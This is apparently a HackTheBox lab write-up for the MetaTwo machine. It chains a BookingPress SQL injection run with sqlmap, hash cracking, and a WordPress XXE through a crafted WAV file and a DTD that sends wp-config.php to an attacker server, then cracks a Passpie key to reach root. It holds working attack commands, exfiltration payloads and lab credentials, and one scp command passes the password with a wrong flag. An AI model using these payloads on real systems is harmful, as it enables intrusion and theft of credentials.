---
title: "HTB - MetaTwo (Easy | Linux | Web)"
date: 2026-09-25 12:00:00 +0000
categories: [HackTheBox, Web]
tags: [htb, linux, wordpress, bookingpress, cve-2022-0739, sqli, sqlmap, john, xxe, cve-2021-29447, passpie, pgp, gpg]
description: "BookingPress SQLi (CVE-2022-0739) to dump WordPress hashes, a media-upload XXE (CVE-2021-29447) to read config & FTP creds, then crack a Passpie PGP key for root"
image:
  path: /assets/img/metatwo.png
---

## **Recon**

```bash
nmap -p- -sSCV --open --min-rate 5000 <target> -oN scans.txt
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://metapress.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Service Discovery Analysis

The Nmap scan reveals three key services running on the target machine:

- **FTP (Port 21):** Port is open but the service version could not be identified — no banner was returned, suggesting it may require credentials or is configured to suppress version information
- **SSH (Port 22):** OpenSSH 8.4p1 on Debian 11
- **HTTP (Port 80):** nginx 1.18.0 — automatically redirects to `http://metapress.htb/`, strongly suggesting a WordPress installation given the domain name

**OS:** Linux (Debian 11) **Domain:** metapress.htb

The domain name `metapress.htb` immediately suggests WordPress — MetaPress is a WordPress ecosystem platform. Combined with the **FTP port open without a clear version**, the attack path becomes clear: exploit a WordPress vulnerability to obtain credentials, then pivot through FTP to gain shell access. We add the domain to `/etc/hosts`:

```bash
echo "<target> metapress.htb" | sudo tee -a /etc/hosts
```

---

## **User**

### WordPress Identification and User Enumeration

Accessing `http://metapress.htb/` confirms a WordPress installation:

![](/assets/img/metatwo/Pasted_image_20260927184144.png)

WordPress exposes a REST API by default. We use it to enumerate registered users without authentication — the `/wp-json/wp/v2/users` endpoint returns a JSON list of all public user accounts:

```bash
curl -s "http://metapress.htb/wp-json/wp/v2/users"
```

![](/assets/img/metatwo/Pasted_image_20260927184555.png)

The `admin` user is confirmed. Password brute-forcing against the login page fails, so we shift focus to enumerating the site's functionality.

### BookingPress Plugin Discovery

The homepage is in a "beta" state and invites users to join a launch event. Clicking the event link and examining the page source reveals multiple `href` attributes pointing to a plugin called **BookingPress**:

![](/assets/img/metatwo/Pasted_image_20260927194727.png)

![](/assets/img/metatwo/Pasted_image_20260927194806.png)

The plugin version is identified as **1.0.10**.

### Overview - CVE-2022-0739 (BookingPress SQL Injection)

**What is BookingPress?** BookingPress is a popular WordPress appointment booking plugin used to manage reservations and scheduling. It processes AJAX requests for retrieving service categories and handles form submissions for bookings.

**What is CVE-2022-0739?** This is an unauthenticated SQL injection vulnerability in BookingPress versions prior to 1.0.11. The `bookingpress_front_get_category_services` AJAX action accepts a `total_service` parameter that is passed directly into a SQL query without sanitization or prepared statements. Any visitor to the site can exploit this to extract data from the WordPress database — no login required.

**Why does it require a `_wpnonce`?** WordPress uses nonces (cryptographic tokens) to protect AJAX actions from Cross-Site Request Forgery. However, the nonce for this particular action is embedded in the page source and visible to any visitor who inspects the page — making it trivially obtainable.

### Exploiting CVE-2022-0739 - Two Methods

#### Method 1: Bash Exploit Script

```bash
git clone https://github.com/lhamouche/Bash-exploit-for-CVE-2022-0739.git
cd Bash-exploit-for-CVE-2022-0739
chmod +x exploit.sh
./exploit.sh --url http://metapress.htb -e events
```

![](/assets/img/metatwo/Pasted_image_20260927195906.png)

#### Method 2: SQLmap

First retrieve the `_wpnonce` value by inspecting the booking page source. Then use sqlmap with the vulnerable parameter `total_service`. The `--random-agent` flag rotates User-Agent strings to avoid basic WAF detection, and `--dbs` enumerates all databases:

```bash
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" \
  --data="action=bookingpress_front_get_category_services&_wpnonce=e8026a3010&category_id=1&total_service=1" \
  -p total_service \
  --batch \
  --dbs --random-agent
```

![](/assets/img/metatwo/Pasted_image_20260927201324.png)

The `blog` database is identified as the WordPress database. We enumerate its tables:

```bash
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" \
--data="action=bookingpress_front_get_category_services&_wpnonce=e8026a3010&category_id=1&total_service=1" \
-p total_service \
--batch \
-D blog \
--tables \
--random-agent
```

![](/assets/img/metatwo/Pasted_image_20260927201427.png)

We dump the `wp_users` table to extract usernames and password hashes:

```bash
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" \
--data="action=bookingpress_front_get_category_services&_wpnonce=e8026a3010&category_id=1&total_service=1" \
-p total_service \
--batch \
-D blog \
-T wp_users \
--dump \
--random-agent
```

![](/assets/img/metatwo/Pasted_image_20260927201629.png)

Two WordPress password hashes are extracted:

- `admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.`
- `manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70`

### Cracking WordPress Password Hashes

WordPress uses `phpass` — a portable PHP password hashing framework that applies multiple rounds of MD5 with a salt. John the Ripper supports this format natively:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
john hash --show
```

```
:partylikearockstar
```

The `manager` account's password is cracked to `partylikearockstar`. The `admin` hash could not be cracked from rockyou.txt.

### WordPress Admin Panel - manager Login

We authenticate to `http://metapress.htb/wp-admin/` as `manager:partylikearockstar`:

![](/assets/img/metatwo/Pasted_image_20260927202040.png)

Access is granted to the WordPress administration panel.

### Overview - CVE-2021-29447 (WordPress XXE via Media Upload)

**What is CVE-2021-29447?** This is an XML External Entity (XXE) injection vulnerability in WordPress versions 5.6.0 to 5.7.0. WordPress's media upload functionality processes WAV audio files and parses their embedded XML metadata (iXML tags) using PHP's `simplexml_load_string()` function, which by default allows external entity resolution.

**What is XXE?** XXE (XML External Entity) injection occurs when an XML parser processes external entity references embedded in user-supplied XML. By defining an entity that references a local file path (`SYSTEM "file:///etc/passwd"`), the parser reads the file and substitutes its contents into the XML output. Combined with SSRF (Server-Side Request Forgery), the file contents can be exfiltrated to an attacker-controlled server.

**The attack chain:**

1. Create a malicious WAV file with embedded XML containing an XXE payload
2. The XML references a remote DTD file on our server
3. The DTD instructs WordPress to read a local file (like `wp-config.php`), base64-encode it, and send it to our HTTP server as a URL parameter

### Exploiting CVE-2021-29447 - WordPress XXE

#### Step 1: Create the DTD File

The DTD (Document Type Definition) defines two entities: one that reads the target file and base64-encodes it using PHP's filter wrapper, and another that sends the encoded content to our HTTP server:

```bash
# xxe.dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://<attacker_ip>:9090/?p=%file;'>" >
```

#### Step 2: Create the Malicious WAV File

We craft a WAV file with a valid RIFF header followed by an iXML chunk containing our XXE payload. The `echo -en` command writes raw bytes including the XML that references our DTD:

```bash
echo -en 'RIFF\x85\x00\x00\x00WAVEiXML\x79\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://<attacker_ip>:9090/xxe.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

#### Step 3: Start HTTP Server

Start a Python HTTP server to serve the DTD file and receive the exfiltrated data:

```bash
sudo python3 -m http.server 9090
```

#### Step 4: Upload the WAV and Capture the Response

Upload `payload.wav` via the WordPress Media Library. When WordPress processes the file, the XXE triggers — our server receives a request with the base64-encoded contents of `wp-config.php`:

![](/assets/img/metatwo/Pasted_image_20260927203752.png)

Decode the captured base64 string:

```bash
echo "BASE64HERE" | base64 -d
```

![](/assets/img/metatwo/Pasted_image_20260927203910.png)

The `wp-config.php` contents are revealed, including **FTP credentials**:

- **Username:** `metapress.htb`
- **Password:** `9NYS_ii@FyL_p5M2NvJ`

### FTP Enumeration

We connect to the FTP server using the credentials extracted from `wp-config.php`:

```bash
ftp metapress.htb@<target>
```

![](/assets/img/metatwo/Pasted_image_20260927204312.png)

Inside the `mailer` directory, we find a PHP file. We download it for inspection:

![](/assets/img/metatwo/Pasted_image_20260927204428.png)

The PHP mailer configuration file contains plaintext credentials for the user `jnelson`:

![](/assets/img/metatwo/Pasted_image_20260927204453.png)

### SSH Access as jnelson

We test the credentials against SSH:

```bash
ssh jnelson@<target>
```

![](/assets/img/metatwo/Pasted_image_20260927204733.png)

A shell is established as `jnelson`. The user flag can now be retrieved.

---

## **Root**

### Hidden Directory Discovery

Listing all files in jnelson's home directory including hidden ones:

```bash
ls -la
```

![](/assets/img/metatwo/Pasted_image_20260927204947.png)

A hidden directory `.passpie` is found — this belongs to Passpie, a command-line password manager.

### Overview - Passpie Password Manager

**What is Passpie?** Passpie is an open-source command-line password manager that stores encrypted credentials in YAML files. Passwords are encrypted using GPG (GNU Privacy Guard) with a master passphrase. The `.passpie` directory contains a `.keys` file with both the public and private PGP keys used for encryption, and subdirectories for each credential category.

**Why is it exploitable here?** The `.keys` file contains the private PGP key used to decrypt all stored passwords. If we can extract this key and crack the passphrase protecting it, we gain access to every password stored in Passpie — including the root SSH password.

### Passpie Enumeration

Running `passpie` shows the stored credentials:

![](/assets/img/metatwo/Pasted_image_20260927205020.png)

Exploring the `.passpie` directory reveals:

```bash
ls -la
```

![](/assets/img/metatwo/Pasted_image_20260927205101.png)

The `ssh` subdirectory contains encrypted credential files for both `jnelson@ssh` and `root@ssh`. The `.keys` file contains the PGP key pair.

### Extracting and Cracking the PGP Key

We copy the `.keys` file to our attacker machine via SCP:

```bash
scp -p 'Cb4_JmWM8zUZWMu@Ys' jnelson@metapress.htb:./.passpie/.keys .
```

We rename the file and use `gpg2john` to convert the private PGP key into a John-crackable hash format:

```bash
mv .keys key
gpg2john key > hash
```

The extracted hash:

```
Passpie:$gpg$*17*54*3072*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0*3*254*2*7*16*21d36a3443b38bad35df0f0e2c77f6b9*65011712*907cb55ccb37aaad:::Passpie (Auto-generated by Passpie) <passpie@local>::key
```

We crack the PGP key passphrase using John:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](/assets/img/metatwo/Pasted_image_20260927211408.png)

**PGP passphrase:** `blink182`

### Extracting Root Password from Passpie

With the master passphrase, we use `passpie copy` to decrypt and extract the root SSH password. The `--to stdout` flag outputs the password directly to the terminal instead of copying it to the clipboard:

```bash
passpie copy --to stdout --passphrase blink182 root@ssh
```

![](/assets/img/metatwo/Pasted_image_20260927211529.png)

The root SSH password is revealed.

### Escalation to Root

Using the extracted root password with `su`:

```bash
su -
```

![](/assets/img/metatwo/Pasted_image_20260927211650.png)

Full root access is achieved. The root flag can now be retrieved.

---

### Attack Chain Summary

1. **Reconnaissance:** Nmap identified FTP on port 21 with no version banner, SSH on port 22, and nginx on port 80 redirecting to `metapress.htb` — suggesting WordPress
2. **WordPress Enumeration:** Confirmed WordPress installation; enumerated users via REST API revealing the `admin` account; identified BookingPress plugin version 1.0.10 in page source
3. **CVE-2022-0739 (BookingPress SQLi):** Exploited unauthenticated SQL injection in the `bookingpress_front_get_category_services` AJAX action to dump the `blog` database
4. **Credential Extraction:** Dumped `wp_users` table extracting `admin` and `manager` WordPress password hashes
5. **Hash Cracking:** Cracked `manager` hash with John the Ripper to obtain `manager:partylikearockstar`
6. **WordPress Login:** Authenticated to `wp-admin` as manager with cracked credentials
7. **CVE-2021-29447 (WordPress XXE):** Crafted malicious WAV file with embedded XXE payload; uploaded via Media Library to trigger XXE; exfiltrated `wp-config.php` contents via base64-encoded HTTP request to attacker server
8. **FTP Credential Discovery:** Decoded `wp-config.php` to obtain FTP credentials `metapress.htb:9NYS_ii@FyL_p5M2NvJ`
9. **FTP Enumeration:** Connected to FTP and found PHP mailer configuration file in the `mailer` directory containing `jnelson` credentials
10. **SSH Access:** Authenticated as jnelson via SSH and retrieved user flag
11. **Passpie Discovery:** Found hidden `.passpie` directory containing PGP-encrypted credential store with `.keys` file
12. **PGP Key Cracking:** Extracted private PGP key with `gpg2john`, cracked passphrase with John the Ripper to obtain `blink182`
13. **Root Password Extraction:** Used `passpie copy` with master passphrase to decrypt and retrieve root SSH password
14. **Root Access:** Escalated to root via `su` and retrieved root flag